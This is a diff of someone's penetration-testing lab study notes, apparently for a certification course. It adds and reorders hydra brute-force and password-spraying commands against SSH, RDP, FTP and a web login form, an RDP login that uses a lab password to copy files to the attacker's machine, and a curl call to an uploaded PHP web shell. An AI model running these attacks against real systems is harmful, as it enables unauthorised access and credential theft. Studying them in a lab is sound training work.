@@ -128,7 +128,9 @@
       wsgidav --host=0.0.0.0 --port=8888 --auth=anonymous --root ~/share
 
       On RDP Windows Machine> Right click PC > Map Network Drive > http://<KALI>:8888/
-      ```  
+      ```
+    - RDP <> Kali
+      `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
     - Linux <> Kali
     - SMB (port 445)
       - `smbclient -L \\\\192.168.171.10`: List available SMB shares on the target  
@@ -693,21 +695,14 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - `curl -k https://192.168.50.45/uploads/shell.php?cmd=whoami`  
      
 ### 15. Password attacks
-    - confirm ssh service running
-      `sudo nmap -sV -p 2222 192.168.50.201`
-    - unzip rockyou
-      `cd /usr/share/wordlists/   sudo gzip -d rockyou.txt.gz`
-    - hydra crack user george  
-      `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
-    - password spraying > enumerate username from a valid password
-      `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.160.201`
-
-### 16. Antivirus evasion  
-- attack network services login
+ - attack network services login
   - SSH
-    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  
-  - RDP
+    `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201`  -l username, -p password wordlist, -s port  
+  - RDP (password spraying)
+    `echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt`: add users
+    `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202`  
   - HTTP POST login
+    `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"` -l user, -P wordlist, http-post-form  
 - password cracking
   - 
 - password hashes
@@ -715,6 +710,9 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
   - NTLMv2
   - relaying NTLMv2
   - Windows credential guard
+
+### 16. Antivirus evasion  
+
 
 ### 17. Windows Privilege Escalation
     - Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)
@@ -1335,11 +1333,12 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
 ### Password Attacks  
 - 16.1.1 SSH and RDP
   **SSH** guess password
-  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`
+  `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.160.201`  
+  `ssh -p 2222 george@192.168.157.201`  
   **RDP** guess user and export flag to local
-  `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`: crack username
-  `mkdir -p ~/shared`: create shared folder
-  `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/shared`: login to RDP and export flag to local
+  `hydra -L /usr/share/wordlists/test_small_credentials.txt -p "SuperS3cure1337#" rdp://192.168.160.202`
+  `mkdir -p ~/share`: create shared folder
+  `xfreerdp3 /u:justin /p:SuperS3cure1337# /v:192.168.160.202 /cert:ignore /drive:share,/home/kali/share`: login to RDP and export flag to local
   **ftp** guess password
   `hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.160.202`
   `ftp itadmin@192.168.160.202`
